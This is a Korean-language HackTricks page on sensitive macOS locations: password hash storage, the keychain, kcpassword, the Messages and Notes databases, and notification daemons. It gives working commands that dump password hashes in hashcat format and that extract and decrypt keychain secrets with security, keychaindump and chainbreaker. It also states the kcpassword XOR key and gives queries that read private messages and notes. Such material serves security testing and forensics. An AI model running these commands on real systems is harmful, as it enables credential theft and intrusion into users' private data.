# macOS 민감한 위치 및 흥미로운 데몬

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* 해킹 요령을 공유하려면 **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소로 PR을 제출하세요.

</details>
{% endhint %}

## 비밀번호

### Shadow Passwords

Shadow 비밀번호는 사용자 구성과 함께 **`/var/db/dslocal/nodes/Default/users/`**에 위치한 plist에 저장됩니다.\
다음 원라이너는 **사용자에 대한 모든 정보** (해시 정보 포함)를 덤프하는 데 사용될 수 있습니다:

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**이와 같은 스크립트**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) 또는 [**이 스크립트**](https://github.com/octomagon/davegrohl.git)를 사용하여 **해시를 hashcat 형식으로** 변환할 수 있습니다.

모든 비서비스 계정의 자격 증명을 macOS PBKDF2-SHA512 형식의 hashcat 형식으로 덤프하는 대체 원 라이너:

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### 키체인 덤프

보안 이진 파일을 사용하여 **암호를 해독하여 덤프할 때**, 사용자에게 이 작업을 허용할 것인지 묻는 프롬프트가 여러 번 표시됩니다.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
이 [주석](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)을 기반으로 보면 이 도구들은 빅 서에서 더 이상 작동하지 않는 것으로 보입니다.
{% endhint %}

### Keychaindump 개요

**keychaindump**라는 도구는 macOS 키체인에서 비밀번호를 추출하기 위해 개발되었지만, Big Sur와 같은 최신 macOS 버전에서 제한 사항을 겪고 있습니다. 이는 [토론](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)에서 언급되었습니다. **keychaindump**의 사용은 공격자가 **root** 권한을 획들해야만 가능합니다. 이 도구는 키체인이 사용자 로그인 시 편의를 위해 기본적으로 잠금 해제되어 있음을 악용하여 응용 프로그램이 사용자의 비밀번호를 반복해서 요구하지 않고도 액세스할 수 있게 합니다. 그러나 사용자가 각 사용 후 키체인을 잠그기로 선택하면 **keychaindump**는 효과가 없어집니다.

**Keychaindump**는 **securityd**라는 특정 프로세스를 대상으로 작동하며, 이는 Apple에 의해 권한 부여 및 암호화 작업을 위한 데몬으로 설명되며 키체인에 액세스하는 데 중요합니다. 추출 프로세스는 사용자 로그인 비밀번호에서 파생된 **Master Key**를 식별하는 것을 포함합니다. 이 키는 키체인 파일을 읽는 데 필수적입니다. **keychaindump**는 `vmmap` 명령을 사용하여 **securityd**의 메모리 힙을 스캔하여 `MALLOC_TINY`로 플래그 지정된 영역 내에서 잠재적인 키를 찾습니다. 이러한 메모리 위치를 검사하기 위해 다음 명령이 사용됩니다:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
잠재적인 마스터 키를 식별한 후 **keychaindump**는 마스터 키 후보를 나타내는 특정 패턴(`0x0000000000000018`)을 찾기 위해 힙을 검색합니다. 이 키를 활용하기 위해서는 **keychaindump** 소스 코드에 기술된 대로 추가 단계, 포함하여 해독 작업이 필요합니다. 이 영역에 집중하는 분석가들은 키체인을 해독하는 데 필수적인 데이터가 **securityd** 프로세스의 메모리에 저장된다는 점을 유의해야 합니다. **keychaindump**를 실행하는 예시 명령어는 다음과 같습니다:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker)은 다음 유형의 정보를 OSX 키패인에서 법의학적으로 안전한 방식으로 추출하는 데 사용할 수 있습니다:

* 해시된 키패인 비밀번호, [hashcat](https://hashcat.net/hashcat/) 또는 [John the Ripper](https://www.openwall.com/john/)로 크랙하기에 적합한 형식
* 인터넷 비밀번호
* 일반 비밀번호
* 개인 키
* 공개 키
* X509 인증서
* 안전한 노트
* Appleshare 비밀번호

키패인 잠금 해제 비밀번호, [volafox](https://github.com/n0fate/volafox) 또는 [volatility](https://github.com/volatilityfoundation/volatility)를 사용하여 얻은 마스터 키, 또는 SystemKey와 같은 잠금 해제 파일이 제공된 경우, Chainbreaker는 또한 평문 비밀번호를 제공합니다.

이러한 방법 중 하나로 키패인을 잠금 해제하지 않은 경우, Chainbreaker는 다른 모든 사용 가능한 정보를 표시합니다.

#### **키패인 키 덤프**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey를 사용하여 키체인 키(비밀번호 포함) 덤프**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **해시를 크래킹하여 키체인 키(비밀번호 포함) 덤프**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **메모리 덤프를 사용하여 키체인 키(비밀번호 포함) 덤프**

[다음 단계](../#dumping-memory-with-osxpmem)를 따라 **메모리 덤프**를 수행합니다.
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **사용자 비밀번호를 사용하여 키체인 키(비밀번호 포함) 덤프**

사용자 비밀번호를 알고 있다면 해당 사용자에 속한 키체인을 덤프하고 복호화할 수 있습니다.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** 파일은 **사용자의 로그인 암호**를 보유하는 파일이지만 시스템 소유자가 **자동 로그인을 활성화**한 경우에만 해당됩니다. 따라서 사용자는 암호를 묻지 않고 자동으로 로그인됩니다 (이는 안전하지 않습니다).

암호는 **`/etc/kcpassword`** 파일에 저장되며 **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** 키로 xor 연산됩니다. 사용자의 암호가 키보다 긴 경우 키가 재사용됩니다.\
이로 인해 암호를 복구하기가 상당히 쉬워지며, 예를 들어 [**이 스크립트**](https://gist.github.com/opshope/32f65875d45215c3677d)를 사용하여 복구할 수 있습니다.

## 데이터베이스의 흥미로운 정보

### 메시지
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 알림

알림 데이터는 `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`에서 찾을 수 있습니다.

대부분의 흥미로운 정보는 **blob**에 있을 것입니다. 따라서 해당 내용을 **추출**하고 **사람이 읽을 수 있는** 형식으로 **변환**하거나 **`strings`**를 사용해야 합니다. 액세스하려면 다음을 수행할 수 있습니다:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### 노트

사용자의 **노트**는 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`에서 찾을 수 있습니다.

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## 환경 설정

macOS 앱의 환경 설정은 **`$HOME/Library/Preferences`**에 위치하며, iOS의 경우 `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`에 있습니다.&#x20;

macOS에서는 **`defaults`**라는 cli 도구를 사용하여 **환경 설정 파일을 수정**할 수 있습니다.

**`/usr/sbin/cfprefsd`**는 XPC 서비스 `com.apple.cfprefsd.daemon` 및 `com.apple.cfprefsd.agent`를 요청하며, 환경 설정을 수정하는 등의 작업을 수행할 수 있습니다.

## 시스템 알림

### Darwin 알림

알림을 위한 주요 데몬은 **`/usr/sbin/notifyd`**입니다. 알림을 받으려면 클라이언트가 `com.apple.system.notification_center` Mach 포트를 통해 등록해야 합니다(`sudo lsmp -p <pid notifyd>`로 확인할 수 있음). 해당 데몬은 `/etc/notify.conf` 파일로 구성할 수 있습니다.

알림에 사용되는 이름은 고유한 역방향 DNS 표기법을 사용하며, 알림이 해당 이름 중 하나로 전송되면 처리할 수 있는 클라이언트가 수신합니다.

현재 상태를 덤프하고(모든 이름을 볼 수 있음) notifyd 프로세스에 SIGUSR2 신호를 보내고 생성된 파일을 읽어들일 수 있습니다: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### 분산 알림 센터

**분산 알림 센터**는 주요 이진 파일이 **`/usr/sbin/distnoted`**인데, 알림을 보내는 또 다른 방법입니다. 일부 XPC 서비스를 노출하며 클라이언트를 확인하기 위해 일부 확인을 수행합니다.

### Apple Push Notifications (APN)

이 경우, 애플리케이션은 **주제**에 등록할 수 있습니다. 클라이언트는 **`apsd`**를 통해 애플의 서버에 연락하여 토큰을 생성할 것입니다.\
그런 다음 제공 업체는 또한 토큰을 생성하고 애플의 서버에 연결하여 클라이언트에게 메시지를 보낼 수 있습니다. 이러한 메시지는 **`apsd`**에 의해 로컬로 수신되며, 이는 해당 애플리케이션을 기다리는 알림을 전달할 것입니다.

환경 설정은 `/Library/Preferences/com.apple.apsd.plist`에 위치합니다.

macOS에는 `/Library/Application\ Support/ApplePushService/aps.db`에, iOS에는 `/var/mobile/Library/ApplePushService`에 메시지의 로컬 데이터베이스가 있습니다. 이 데이터베이스에는 `incoming_messages`, `outgoing_messages`, `channel`이라는 3개의 테이블이 있습니다.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
또한 다음을 사용하여 데몬 및 연결에 대한 정보를 얻을 수 있습니다:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## 사용자 알림

이것들은 사용자가 화면에서 볼 수 있는 알림입니다:

- **`CFUserNotification`**: 이 API는 화면에 메시지가 포함된 팝업을 표시하는 방법을 제공합니다.
- **게시판**: iOS에서 사라지는 배너를 표시하며, 알림 센터에 저장됩니다.
- **`NSUserNotificationCenter`**: 이것은 MacOS의 iOS 게시판입니다. 알림과 관련된 데이터베이스는 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`에 위치해 있습니다.
